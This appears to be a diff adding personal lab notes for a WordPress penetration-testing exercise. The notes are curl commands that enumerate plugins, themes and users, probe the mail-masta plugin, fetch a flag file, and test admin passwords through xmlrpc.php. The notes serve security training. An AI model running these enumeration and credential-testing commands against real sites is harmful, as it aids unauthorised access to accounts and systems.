@@ -1,0 +1,18 @@
+# plugins
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+# themes
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+# plugins active enum
+curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
+# speed up the process with wpscan
+# exercise 1
+curl -s -X GET http://83.136.252.32:32695 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+curl -s -X GET http://83.136.252.32:32695/wp-content/plugins/mail-masta/ | html2text
+curl -s -X GET http://83.136.252.32:32695/wp-content/plugins/mail-masta/inc/flag.txt | html2text
+# user enumeration
+curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
+curl http://83.136.252.32:32695/wp-json/wp/v2/users | jq
+# check credentials
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://83.136.252.32:32695/xmlrpc.php | wc -l
